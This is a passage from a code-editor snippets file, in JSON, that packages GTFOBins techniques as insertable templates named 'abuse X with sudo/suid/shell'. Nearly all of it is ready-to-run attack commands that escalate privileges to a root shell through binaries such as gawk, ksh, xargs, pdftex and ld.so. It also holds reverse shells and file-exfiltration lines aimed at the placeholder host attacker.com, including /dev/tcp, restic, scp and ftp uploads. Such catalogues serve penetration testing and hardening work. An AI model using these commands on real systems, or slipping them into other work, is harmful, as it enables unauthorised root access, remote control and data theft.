            "./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse rview with capabilities - This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "rview limited-suid (gtfobins)": {
        "prefix": "rview limited-suid",
        "body": [
            "abuse rview with limited-suid, This requires that `rview` is compiled with Lua support.",
            "",
            "```sh",
            "./rview -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse rview with limited-suid - This requires that `rview` is compiled with Lua support."
    },
    "tcpdump command (gtfobins)": {
        "prefix": "tcpdump command",
        "body": [
            "abuse tcpdump with command",
            "",
            "```sh",
            "COMMAND='id'",
            "TF=\\$(mktemp)",
            "echo \"\\$COMMAND\" > \\$TF",
            "chmod +x \\$TF",
            "tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z \\$TF${0}",
            "```"
        ],
        "description": "abuse tcpdump with command"
    },
    "tcpdump sudo (gtfobins)": {
        "prefix": "tcpdump sudo",
        "body": [
            "abuse tcpdump with sudo",
            "",
            "```sh",
            "COMMAND='id'",
            "TF=\\$(mktemp)",
            "echo \"\\$COMMAND\" > \\$TF",
            "chmod +x \\$TF",
            "sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z \\$TF -Z root${0}",
            "```"
        ],
        "description": "abuse tcpdump with sudo"
    },
    "alpine file-read (gtfobins)": {
        "prefix": "alpine file-read",
        "body": [
            "abuse alpine with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "alpine -F \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse alpine with file-read"
    },
    "alpine suid (gtfobins)": {
        "prefix": "alpine suid",
        "body": [
            "abuse alpine with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./alpine -F \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse alpine with suid"
    },
    "alpine sudo (gtfobins)": {
        "prefix": "alpine sudo",
        "body": [
            "abuse alpine with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo alpine -F \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse alpine with sudo"
    },
    "file file-read (gtfobins)": {
        "prefix": "file file-read",
        "body": [
            "abuse file with file-read, \nEach line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.\n\n\n\nIf a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.\n\n\n\nIt can also be provided with a directory and will read each file in the directory.\n",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "file -m \\$LFILE${0}",
            "```"
        ],
        "description": "abuse file with file-read - \nEach line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.\n\n\n\nIf a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.\n\n\n\nIt can also be provided with a directory and will read each file in the directory.\n"
    },
    "file suid (gtfobins)": {
        "prefix": "file suid",
        "body": [
            "abuse file with suid, Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./file -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse file with suid - Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files."
    },
    "file sudo (gtfobins)": {
        "prefix": "file sudo",
        "body": [
            "abuse file with sudo, Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo file -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse file with sudo - Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files."
    },
    "dig file-read (gtfobins)": {
        "prefix": "dig file-read",
        "body": [
            "abuse dig with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "dig -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse dig with file-read"
    },
    "dig sudo (gtfobins)": {
        "prefix": "dig sudo",
        "body": [
            "abuse dig with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo dig -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse dig with sudo"
    },
    "dig suid (gtfobins)": {
        "prefix": "dig suid",
        "body": [
            "abuse dig with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./dig -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse dig with suid"
    },
    "pdftex shell (gtfobins)": {
        "prefix": "pdftex shell",
        "body": [
            "abuse pdftex with shell",
            "",
            "```sh",
            "pdftex --shell-escape '\\write18{/bin/sh}\\end'${0}",
            "```"
        ],
        "description": "abuse pdftex with shell"
    },
    "pdftex sudo (gtfobins)": {
        "prefix": "pdftex sudo",
        "body": [
            "abuse pdftex with sudo",
            "",
            "```sh",
            "sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'${0}",
            "```"
        ],
        "description": "abuse pdftex with sudo"
    },
    "pdftex limited-suid (gtfobins)": {
        "prefix": "pdftex limited-suid",
        "body": [
            "abuse pdftex with limited-suid",
            "",
            "```sh",
            "./pdftex --shell-escape '\\write18{/bin/sh}\\end'${0}",
            "```"
        ],
        "description": "abuse pdftex with limited-suid"
    },
    "xetex shell (gtfobins)": {
        "prefix": "xetex shell",
        "body": [
            "abuse xetex with shell",
            "",
            "```sh",
            "xetex --shell-escape '\\write18{/bin/sh}\\end'${0}",
            "```"
        ],
        "description": "abuse xetex with shell"
    },
    "xetex sudo (gtfobins)": {
        "prefix": "xetex sudo",
        "body": [
            "abuse xetex with sudo",
            "",
            "```sh",
            "sudo xetex --shell-escape '\\write18{/bin/sh}\\end'${0}",
            "```"
        ],
        "description": "abuse xetex with sudo"
    },
    "xetex limited-suid (gtfobins)": {
        "prefix": "xetex limited-suid",
        "body": [
            "abuse xetex with limited-suid",
            "",
            "```sh",
            "./xetex --shell-escape '\\write18{/bin/sh}\\end'${0}",
            "```"
        ],
        "description": "abuse xetex with limited-suid"
    },
    "gawk shell (gtfobins)": {
        "prefix": "gawk shell",
        "body": [
            "abuse gawk with shell",
            "",
            "```sh",
            "gawk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse gawk with shell"
    },
    "gawk non-interactive-reverse-shell (gtfobins)": {
        "prefix": "gawk non-interactive-reverse-shell",
        "body": [
            "abuse gawk with non-interactive-reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "gawk -v RHOST=\\$RHOST -v RPORT=\\$RPORT 'BEGIN {",
            "    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;",
            "    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;",
            "    while (c && (c |& getline) > 0) print \\$0 |& s; close(c)}}'${0}",
            "```"
        ],
        "description": "abuse gawk with non-interactive-reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "gawk non-interactive-bind-shell (gtfobins)": {
        "prefix": "gawk non-interactive-bind-shell",
        "body": [
            "abuse gawk with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell.",
            "",
            "```sh",
            "LPORT=${1:12345}",
            "gawk -v LPORT=\\$LPORT 'BEGIN {",
            "    s = \"/inet/tcp/\" LPORT \"/0/0\";",
            "    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;",
            "    while (c && (c |& getline) > 0) print \\$0 |& s; close(c)}}'${0}",
            "```"
        ],
        "description": "abuse gawk with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell."
    },
    "gawk file-write (gtfobins)": {
        "prefix": "gawk file-write",
        "body": [
            "abuse gawk with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "gawk -v LFILE=\\$LFILE 'BEGIN { print \"DATA\" > LFILE }'${0}",
            "```"
        ],
        "description": "abuse gawk with file-write"
    },
    "gawk file-read (gtfobins)": {
        "prefix": "gawk file-read",
        "body": [
            "abuse gawk with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "gawk '//' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse gawk with file-read"
    },
    "gawk suid (gtfobins)": {
        "prefix": "gawk suid",
        "body": [
            "abuse gawk with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./gawk '//' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse gawk with suid"
    },
    "gawk sudo (gtfobins)": {
        "prefix": "gawk sudo",
        "body": [
            "abuse gawk with sudo",
            "",
            "```sh",
            "sudo gawk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse gawk with sudo"
    },
    "gawk limited-suid (gtfobins)": {
        "prefix": "gawk limited-suid",
        "body": [
            "abuse gawk with limited-suid",
            "",
            "```sh",
            "./gawk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse gawk with limited-suid"
    },
    "xargs shell (gtfobins)": {
        "prefix": "xargs shell",
        "body": [
            "abuse xargs with shell, Read interactively from `stdin`.",
            "",
            "```sh",
            "xargs -Ix sh -c 'exec sh 0<&1'",
            "x^D^D${0}",
            "```"
        ],
        "description": "abuse xargs with shell - Read interactively from `stdin`."
    },
    "xargs file-read (gtfobins)": {
        "prefix": "xargs file-read",
        "body": [
            "abuse xargs with file-read, This works as long as the file does not contain the NUL character, also a trailing `$'\\n'` is added. The actual `/bin/echo` command is executed. GNU version only.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "xargs -a \"\\$LFILE\" -0${0}",
            "```"
        ],
        "description": "abuse xargs with file-read - This works as long as the file does not contain the NUL character, also a trailing `$'\\n'` is added. The actual `/bin/echo` command is executed. GNU version only."
    },
    "xargs suid (gtfobins)": {
        "prefix": "xargs suid",
        "body": [
            "abuse xargs with suid, GNU version only.",
            "",
            "```sh",
            "./xargs -a /dev/null sh -p${0}",
            "```"
        ],
        "description": "abuse xargs with suid - GNU version only."
    },
    "xargs sudo (gtfobins)": {
        "prefix": "xargs sudo",
        "body": [
            "abuse xargs with sudo, GNU version only.",
            "",
            "```sh",
            "sudo xargs -a /dev/null sh${0}",
            "```"
        ],
        "description": "abuse xargs with sudo - GNU version only."
    },
    "expand file-read (gtfobins)": {
        "prefix": "expand file-read",
        "body": [
            "abuse expand with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "expand \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse expand with file-read"
    },
    "expand suid (gtfobins)": {
        "prefix": "expand suid",
        "body": [
            "abuse expand with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./expand \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse expand with suid"
    },
    "expand sudo (gtfobins)": {
        "prefix": "expand sudo",
        "body": [
            "abuse expand with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo expand \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse expand with sudo"
    },
    "nsenter shell (gtfobins)": {
        "prefix": "nsenter shell",
        "body": [
            "abuse nsenter with shell",
            "",
            "```sh",
            "nsenter /bin/sh${0}",
            "```"
        ],
        "description": "abuse nsenter with shell"
    },
    "nsenter sudo (gtfobins)": {
        "prefix": "nsenter sudo",
        "body": [
            "abuse nsenter with sudo",
            "",
            "```sh",
            "sudo nsenter /bin/sh${0}",
            "```"
        ],
        "description": "abuse nsenter with sudo"
    },
    "strings file-read (gtfobins)": {
        "prefix": "strings file-read",
        "body": [
            "abuse strings with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "strings \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse strings with file-read"
    },
    "strings suid (gtfobins)": {
        "prefix": "strings suid",
        "body": [
            "abuse strings with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./strings \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse strings with suid"
    },
    "strings sudo (gtfobins)": {
        "prefix": "strings sudo",
        "body": [
            "abuse strings with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo strings \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse strings with sudo"
    },
    "restic file-upload (gtfobins)": {
        "prefix": "restic file-upload",
        "body": [
            "abuse restic with file-upload",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "LFILE=file_or_dir_to_get",
            "NAME=backup_name",
            "restic backup -r \"rest:http://\\$RHOST:\\$RPORT/\\$NAME\" \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse restic with file-upload"
    },
    "restic sudo (gtfobins)": {
        "prefix": "restic sudo",
        "body": [
            "abuse restic with sudo",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "LFILE=file_or_dir_to_get",
            "NAME=backup_name",
            "sudo restic backup -r \"rest:http://\\$RHOST:\\$RPORT/\\$NAME\" \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse restic with sudo"
    },
    "restic suid (gtfobins)": {
        "prefix": "restic suid",
        "body": [
            "abuse restic with suid",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "LFILE=file_or_dir_to_get",
            "NAME=backup_name",
            "./restic backup -r \"rest:http://\\$RHOST:\\$RPORT/\\$NAME\" \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse restic with suid"
    },
    "setfacl suid (gtfobins)": {
        "prefix": "setfacl suid",
        "body": [
            "abuse setfacl with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_change}",
            "USER=somebody",
            "./setfacl -m u:\\$USER:rwx \\$LFILE${0}",
            "```"
        ],
        "description": "abuse setfacl with suid"
    },
    "setfacl sudo (gtfobins)": {
        "prefix": "setfacl sudo",
        "body": [
            "abuse setfacl with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_change}",
            "USER=somebody",
            "sudo setfacl -m -u:\\$USER:rwx \\$LFILE${0}",
            "```"
        ],
        "description": "abuse setfacl with sudo"
    },
    "xxd file-write (gtfobins)": {
        "prefix": "xxd file-write",
        "body": [
            "abuse xxd with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo DATA | xxd | xxd -r - \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse xxd with file-write"
    },
    "xxd file-read (gtfobins)": {
        "prefix": "xxd file-read",
        "body": [
            "abuse xxd with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "xxd \"\\$LFILE\" | xxd -r${0}",
            "```"
        ],
        "description": "abuse xxd with file-read"
    },
    "xxd suid (gtfobins)": {
        "prefix": "xxd suid",
        "body": [
            "abuse xxd with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./xxd \"\\$LFILE\" | xxd -r${0}",
            "```"
        ],
        "description": "abuse xxd with suid"
    },
    "xxd sudo (gtfobins)": {
        "prefix": "xxd sudo",
        "body": [
            "abuse xxd with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo xxd \"\\$LFILE\" | xxd -r${0}",
            "```"
        ],
        "description": "abuse xxd with sudo"
    },
    "cowthink shell (gtfobins)": {
        "prefix": "cowthink shell",
        "body": [
            "abuse cowthink with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'exec \"/bin/sh\";' >\\$TF",
            "cowthink -f \\$TF x${0}",
            "```"
        ],
        "description": "abuse cowthink with shell"
    },
    "cowthink sudo (gtfobins)": {
        "prefix": "cowthink sudo",
        "body": [
            "abuse cowthink with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'exec \"/bin/sh\";' >\\$TF",
            "sudo cowthink -f \\$TF x${0}",
            "```"
        ],
        "description": "abuse cowthink with sudo"
    },
    "efax suid (gtfobins)": {
        "prefix": "efax suid",
        "body": [
            "abuse efax with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./efax -d \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse efax with suid"
    },
    "efax sudo (gtfobins)": {
        "prefix": "efax sudo",
        "body": [
            "abuse efax with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo efax -d \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse efax with sudo"
    },
    "eqn file-read (gtfobins)": {
        "prefix": "eqn file-read",
        "body": [
            "abuse eqn with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "eqn \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse eqn with file-read"
    },
    "eqn suid (gtfobins)": {
        "prefix": "eqn suid",
        "body": [
            "abuse eqn with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./eqn \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse eqn with suid"
    },
    "eqn sudo (gtfobins)": {
        "prefix": "eqn sudo",
        "body": [
            "abuse eqn with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo eqn \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse eqn with sudo"
    },
    "tasksh shell (gtfobins)": {
        "prefix": "tasksh shell",
        "body": [
            "abuse tasksh with shell",
            "",
            "```sh",
            "tasksh",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse tasksh with shell"
    },
    "tasksh limited-suid (gtfobins)": {
        "prefix": "tasksh limited-suid",
        "body": [
            "abuse tasksh with limited-suid",
            "",
            "```sh",
            "./tasksh",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse tasksh with limited-suid"
    },
    "tasksh sudo (gtfobins)": {
        "prefix": "tasksh sudo",
        "body": [
            "abuse tasksh with sudo",
            "",
            "```sh",
            "sudo tasksh",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse tasksh with sudo"
    },
    "byebug shell (gtfobins)": {
        "prefix": "byebug shell",
        "body": [
            "abuse byebug with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'system(\"/bin/sh\")' > \\$TF",
            "byebug \\$TF",
            "continue${0}",
            "```"
        ],
        "description": "abuse byebug with shell"
    },
    "byebug limited-suid (gtfobins)": {
        "prefix": "byebug limited-suid",
        "body": [
            "abuse byebug with limited-suid",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'system(\"/bin/sh\")' > \\$TF",
            "./byebug \\$TF",
            "continue${0}",
            "```"
        ],
        "description": "abuse byebug with limited-suid"
    },
    "byebug sudo (gtfobins)": {
        "prefix": "byebug sudo",
        "body": [
            "abuse byebug with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'system(\"/bin/sh\")' > \\$TF",
            "sudo byebug \\$TF",
            "continue${0}",
            "```"
        ],
        "description": "abuse byebug with sudo"
    },
    "fish shell (gtfobins)": {
        "prefix": "fish shell",
        "body": [
            "abuse fish with shell",
            "",
            "```sh",
            "fish${0}",
            "```"
        ],
        "description": "abuse fish with shell"
    },
    "fish suid (gtfobins)": {
        "prefix": "fish suid",
        "body": [
            "abuse fish with suid",
            "",
            "```sh",
            "./fish${0}",
            "```"
        ],
        "description": "abuse fish with suid"
    },
    "fish sudo (gtfobins)": {
        "prefix": "fish sudo",
        "body": [
            "abuse fish with sudo",
            "",
            "```sh",
            "sudo fish${0}",
            "```"
        ],
        "description": "abuse fish with sudo"
    },
    "ksh shell (gtfobins)": {
        "prefix": "ksh shell",
        "body": [
            "abuse ksh with shell",
            "",
            "```sh",
            "ksh${0}",
            "```"
        ],
        "description": "abuse ksh with shell"
    },
    "ksh reverse-shell (gtfobins)": {
        "prefix": "ksh reverse-shell",
        "body": [
            "abuse ksh with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "ksh -c 'ksh -i > /dev/tcp/\\$RHOST/\\$RPORT 2>&1 0>&1'${0}",
            "```"
        ],
        "description": "abuse ksh with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "ksh file-upload (gtfobins)": {
        "prefix": "ksh file-upload",
        "body": [
            "abuse ksh with file-upload, Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.",
            "",
            "```sh",
            "export RHOST=${2:attacker.com}",
            "export RPORT=${3:12345}",
            "export LFILE=${1:file_to_send}",
            "ksh -c 'cat \\$LFILE > /dev/tcp/\\$RHOST/\\$RPORT'${0}",
            "```"
        ],
        "description": "abuse ksh with file-upload - Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file."
    },
    "ksh file-download (gtfobins)": {
        "prefix": "ksh file-download",
        "body": [
            "abuse ksh with file-download, Fetch remote file using a TCP connection. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "export LFILE=file_to_get",
            "ksh -c 'cat < /dev/tcp/\\$RHOST/\\$RPORT > \\$LFILE'${0}",
            "```"
        ],
        "description": "abuse ksh with file-download - Fetch remote file using a TCP connection. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file."
    },
    "ksh file-write (gtfobins)": {
        "prefix": "ksh file-write",
        "body": [
            "abuse ksh with file-write",
            "",
            "```sh",
            "export LFILE=${1:file_to_write}",
            "ksh -c 'echo DATA > \\$LFILE'${0}",
            "```"
        ],
        "description": "abuse ksh with file-write"
    },
    "ksh file-read (gtfobins)": {
        "prefix": "ksh file-read",
        "body": [
            "abuse ksh with file-read, It trims trailing newlines.",
            "",
            "```sh",
            "export LFILE=${1:file_to_read}",
            "ksh -c \\$'read -r -d \\x04 < \"\\$LFILE\"; echo \"\\$REPLY\"'${0}",
            "```"
        ],
        "description": "abuse ksh with file-read - It trims trailing newlines."
    },
    "ksh suid (gtfobins)": {
        "prefix": "ksh suid",
        "body": [
            "abuse ksh with suid",
            "",
            "```sh",
            "./ksh -p${0}",
            "```"
        ],
        "description": "abuse ksh with suid"
    },
    "ksh sudo (gtfobins)": {
        "prefix": "ksh sudo",
        "body": [
            "abuse ksh with sudo",
            "",
            "```sh",
            "sudo ksh${0}",
            "```"
        ],
        "description": "abuse ksh with sudo"
    },
    "scp shell (gtfobins)": {
        "prefix": "scp shell",
        "body": [
            "abuse scp with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'sh 0<&2 1>&2' > \\$TF",
            "chmod +x \"\\$TF\"",
            "scp -S \\$TF x y:${0}",
            "```"
        ],
        "description": "abuse scp with shell"
    },
    "scp file-upload (gtfobins)": {
        "prefix": "scp file-upload",
        "body": [
            "abuse scp with file-upload, Send local file to a SSH server.",
            "",
            "```sh",
            "RPATH=user@${3:attacker.com}:~/${2:file_to_save}",
            "LPATH=${1:file_to_send}",
            "scp \\$LFILE \\$RPATH${0}",
            "```"
        ],
        "description": "abuse scp with file-upload - Send local file to a SSH server."
    },
    "scp file-download (gtfobins)": {
        "prefix": "scp file-download",
        "body": [
            "abuse scp with file-download, Fetch a remote file from a SSH server.",
            "",
            "```sh",
            "RPATH=user@${2:attacker.com}:~/file_to_get",
            "LFILE=${1:file_to_save}",
            "scp \\$RPATH \\$LFILE${0}",
            "```"
        ],
        "description": "abuse scp with file-download - Fetch a remote file from a SSH server."
    },
    "scp sudo (gtfobins)": {
        "prefix": "scp sudo",
        "body": [
            "abuse scp with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'sh 0<&2 1>&2' > \\$TF",
            "chmod +x \"\\$TF\"",
            "sudo scp -S \\$TF x y:${0}",
            "```"
        ],
        "description": "abuse scp with sudo"
    },
    "scp limited-suid (gtfobins)": {
        "prefix": "scp limited-suid",
        "body": [
            "abuse scp with limited-suid",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'sh 0<&2 1>&2' > \\$TF",
            "chmod +x \"\\$TF\"",
            "./scp -S \\$TF a b:${0}",
            "```"
        ],
        "description": "abuse scp with limited-suid"
    },
    "ld.so shell (gtfobins)": {
        "prefix": "ld.so shell",
        "body": [
            "abuse ld.so with shell",
            "",
            "```sh",
            "/lib/ld.so /bin/sh${0}",
            "```"
        ],
        "description": "abuse ld.so with shell"
    },
    "ld.so suid (gtfobins)": {
        "prefix": "ld.so suid",
        "body": [
            "abuse ld.so with suid",
            "",
            "```sh",
            "./ld.so /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse ld.so with suid"
    },
    "ld.so sudo (gtfobins)": {
        "prefix": "ld.so sudo",
        "body": [
            "abuse ld.so with sudo",
            "",
            "```sh",
            "sudo /lib/ld.so /bin/sh${0}",
            "```"
        ],
        "description": "abuse ld.so with sudo"
    },
    "dotnet shell (gtfobins)": {
        "prefix": "dotnet shell",
        "body": [
            "abuse dotnet with shell",
            "",
            "```sh",
            "dotnet fsi",
            "System.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;${0}",
            "```"
        ],
        "description": "abuse dotnet with shell"
    },
    "dotnet file-read (gtfobins)": {
        "prefix": "dotnet file-read",
        "body": [
            "abuse dotnet with file-read",
            "",
            "```sh",
            "export LFILE=${1:file_to_read}",
            "dotnet fsi",
            "System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(\"LFILE\"));;${0}",
            "```"
        ],
        "description": "abuse dotnet with file-read"
    },
    "dotnet sudo (gtfobins)": {
        "prefix": "dotnet sudo",
        "body": [
            "abuse dotnet with sudo",
            "",
            "```sh",
            "sudo dotnet fsi",
            "System.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;${0}",
            "```"
        ],
        "description": "abuse dotnet with sudo"
    },
    "atobm file-read (gtfobins)": {
        "prefix": "atobm file-read",
        "body": [
            "abuse atobm with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "atobm \\$LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", \\$2}'${0}",
            "```"
        ],
        "description": "abuse atobm with file-read"
    },
    "atobm sudo (gtfobins)": {
        "prefix": "atobm sudo",
        "body": [
            "abuse atobm with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo atobm \\$LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", \\$2}'${0}",
            "```"
        ],
        "description": "abuse atobm with sudo"
    },
    "atobm suid (gtfobins)": {
        "prefix": "atobm suid",
        "body": [
            "abuse atobm with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./atobm \\$LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", \\$2}'${0}",
            "```"
        ],
        "description": "abuse atobm with suid"
    },
    "volatility shell (gtfobins)": {
        "prefix": "volatility shell",
        "body": [
            "abuse volatility with shell",
            "",
            "```sh",
            "volatility -f file.dump volshell",
            "__import__('os').system('/bin/sh')${0}",
            "```"
        ],
        "description": "abuse volatility with shell"
    },
    "check_raid file-read (gtfobins)": {
        "prefix": "check_raid file-read",
        "body": [
            "abuse check_raid with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "check_raid --extra-opts=@\\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_raid with file-read"
    },
    "check_raid sudo (gtfobins)": {
        "prefix": "check_raid sudo",
        "body": [
            "abuse check_raid with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo check_raid --extra-opts=@\\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_raid with sudo"
    },
    "octave shell (gtfobins)": {
        "prefix": "octave shell",
        "body": [
            "abuse octave with shell",
            "",
            "```sh",
            "octave-cli --eval 'system(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse octave with shell"
    },
    "octave file-write (gtfobins)": {
        "prefix": "octave file-write",
        "body": [
            "abuse octave with file-write",
            "",
            "```sh",
            "octave-cli --eval 'filename = \"${1:file_to_write}\"; fid = fopen(filename, \"w\"); fputs(fid, \"DATA\"); fclose(fid);'${0}",
            "```"
        ],
        "description": "abuse octave with file-write"
    },
    "octave file-read (gtfobins)": {
        "prefix": "octave file-read",
        "body": [
            "abuse octave with file-read",
            "",
            "```sh",
            "octave-cli --eval 'format none; fid = fopen(\"${1:file_to_read}\"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'${0}",
            "```"
        ],
        "description": "abuse octave with file-read"
    },
    "octave sudo (gtfobins)": {
        "prefix": "octave sudo",
        "body": [
            "abuse octave with sudo",
            "",
            "```sh",
            "sudo octave-cli --eval 'system(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse octave with sudo"
    },
    "octave limited-suid (gtfobins)": {
        "prefix": "octave limited-suid",
        "body": [
            "abuse octave with limited-suid",
            "",
            "```sh",
            "./octave-cli --eval 'system(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse octave with limited-suid"
    },
    "ftp shell (gtfobins)": {
        "prefix": "ftp shell",
        "body": [
            "abuse ftp with shell",
            "",
            "```sh",
            "ftp",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ftp with shell"
    },
    "ftp file-upload (gtfobins)": {
        "prefix": "ftp file-upload",
        "body": [
            "abuse ftp with file-upload, Send local file to a FTP server.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "ftp \\$RHOST",
            "put ${1:file_to_send}${0}",
            "```"
        ],
        "description": "abuse ftp with file-upload - Send local file to a FTP server."
    },
    "ftp file-download (gtfobins)": {
        "prefix": "ftp file-download",
        "body": [
            "abuse ftp with file-download, Fetch a remote file from a FTP server.",
            "",
            "```sh",
